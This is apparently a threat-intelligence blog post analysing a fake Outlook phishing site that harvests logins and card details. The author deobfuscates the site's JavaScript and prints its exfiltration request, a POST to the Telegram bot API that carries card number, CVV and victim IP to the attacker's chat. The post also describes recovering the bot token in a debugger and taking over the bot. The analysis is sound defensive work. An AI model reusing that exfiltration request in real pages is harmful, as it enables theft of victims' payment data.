# CTI ID: 01-A-001 xmailline-verfo0l.zya.me
---

**Welcome** to this new blog series on *Cyber Threat Intelligence* (**CTI**), where we'll explore how I identify, analyze, and document digital threats in real time. The goal of this series is to provide a practical and educational look into the world of offensive and defensive cybersecurity, helping readers understand the techniques and tools used to stay safe in cyberspace.

In this first chapter, we'll focus on analyzing a [phishing](https://en.wikipedia.org/wiki/Phishing) website—one of the most common and effective threats users face today. Through this practical case, we’ll learn some of the tactics cybercriminals use in everyday life, and at the end, I’ll share some practical tips to avoid falling into these deadly traps.

Get ready to dive into the world of threat analysis and discover how CTI knowledge helped me dismantle this digital threat.

---

# Technical CTI

## ⚠️ Warning: This block is for cybersecurity nerds who want to see the step-by-step process.

It all started when a friend sent me two screenshots of a suspicious email via *Discord*.

![1](https://github.com/user-attachments/assets/c98fab2b-60d2-4d56-be2d-8c6aa64b1225)

One thing immediately stood out: a [URL](https://en.wikipedia.org/wiki/Uniform_Resource_Locator), `https://xmailline-verfo0l.zya.me/`, which didn’t match the real [*Outlook*](https://outlook.live.com) domain. That alone is a major red flag.

I decided to investigate by visiting the site from a Virtual Machine and got this:

<img width="1919" height="969" alt="Screenshot 2025-08-21 210313" src="https://github.com/user-attachments/assets/c9ece646-724c-48c3-8210-691db1594832" />

Upon accessing the URL, we see a **somewhat decent imitation** of outlook.live.com, but with a few UI flaws. Entering an email (I used a fake one for testing) redirects to `_index.html`, where it asks for the Outlook password, and then to `_indexx.html`.

<img width="1919" height="970" alt="Screenshot 2025-08-21 210051" src="https://github.com/user-attachments/assets/b2071438-dbe7-4e80-a46f-04d90d477f0b" />

Here, it asks for bank details, supposedly to buy an email account for $0.89 USD per year—even though this is **completely free**. Looking at the source code of `_indexx.html`, I found something interesting.

<img width="1893" height="579" alt="Screenshot 2025-08-21 210214" src="https://github.com/user-attachments/assets/76b0cb7c-fcee-4aef-a9c1-9f91176007d7" />

That’s right—the HTML was running two JavaScript files with suspicious, obfuscated code. Despite the obfuscation, I noticed something related to a Telegram bot in the embedded JS. This was confirmed when I found and deobfuscated `tlgram.js`.

<img width="1898" height="533" alt="Screenshot 2025-08-21 210242" src="https://github.com/user-attachments/assets/821e4479-7b56-4190-b876-111bb58bf97d" />

**Then I deobfuscated it using https://deobfuscate.io/**

<img width="1338" height="835" alt="Screenshot 2025-08-22 010711" src="https://github.com/user-attachments/assets/6bb13361-dff3-4e9e-acbd-7af924405f5a" />

Now we have more readable code, which shows that the HTML sends a request to a Telegram bot once data is collected. The request would look like this:

```bash
POST https://api.telegram.org/bot<T0KEN>/sendMessage
Content-Type: application/json
cache-control: no-cache
{
  "chat_id": "<CHATID>",
  "text": "🍄🍄0UTL🍄🍄\n\nCARD-NUM: [CARD_NUMBER]\nNAME: [CARDHOLDER_NAME]\nEXPIRY: [MM]/[YY]\nCVV: [CVV]\n🌎IP: [VICTIM_IP]\n[CITY], [COUNTRY]"
```
Now we need to discover the values of `<CHATID>` and `<T0KEN>`. First, I downloaded `tlgram.js` and tried injecting code into the obfuscated script to log variable values.

<img width="1427" height="687" alt="Screenshot 2025-08-21 214015" src="https://github.com/user-attachments/assets/8db98171-1c56-4275-a2d6-1f297d643707" />

Initially, it didn’t work—apparently the cybercriminal anticipated this and split the values into multiple encrypted strings decoded gradually. Knowing this, I had an idea: if I purge the code line by line, I might catch the values of `<CHATID>` and `<T0KEN>` in Chrome DevTools global scope using a separate Node.js debug tab. I got to work—and it paid off.

First, I ran the encrypted script in a terminal with:

```bash
node --inspect-brk tlgram.js
```

<img width="947" height="87" alt="Screenshot 2025-08-21 214119" src="https://github.com/user-attachments/assets/10ae39ff-324f-466d-8e4c-e3492ee8607f" />

Then I placed a breakpoint where variables were defined, stepping into and over the code using DevTools. Eventually, I obtained both values in the Scope section of DevTools.

<img width="1919" height="924" alt="Diseño sin título (1)" src="https://github.com/user-attachments/assets/bacb345d-78c5-46a2-b984-c5667e7ca273" />

With those values, I was able to “take over” the Telegram bot using a Python tool called Matkap, which manipulates malicious Telegram bots and extracts conversations or disables them.

<img width="1919" height="863" alt="Screenshot 2025-08-22 001918" src="https://github.com/user-attachments/assets/7cbbd64a-78da-458e-aacb-b06c47528f9b" />

So I launched Matkap again.

<img width="1625" height="911" alt="Screenshot 2025-08-21 205934" src="https://github.com/user-attachments/assets/aa367a30-48ef-449e-a157-bf2c47213213" />

After running it with both values, I successfully took over the bot. I saw that it had over 100 messages from victims who had fallen for the scam. Later, for some reason, those messages disappeared, and I only saw the two fake ones I sent while pretending to be a victim. Still, the operation was a success because I got access to the bot.

<img width="1441" height="865" alt="Screenshot 2025-08-21 235651" src="https://github.com/user-attachments/assets/2e041792-3e7c-4a3a-b116-e8224e6093c6" />

Then, the attacker sent a command to the bot, and I got their Telegram ID. I messaged them from another account pretending to be interested in buying a "combolist" of credit cards. During the chat, they revealed they were from the Dominican Republic. When I tried to get more info, they got angry and blocked me.

Since I couldn’t do much more, I reported both the Telegram user and the bot. I looked up the hosting provider (I Fastnet Ltd) and submitted a takedown request due to malicious use. I also reported the site’s IP to IP Abuse and submitted the URL to VirusTotal.

---

# Summary and Tips

⚠️ Phishing is one of the most common scams on the Internet.
In this case, attackers created a fake Outlook copy to steal emails, passwords, and even banking details.

# Remember:

You are the first line of defense.
One less click could save you a massive headache.
Stay safe.
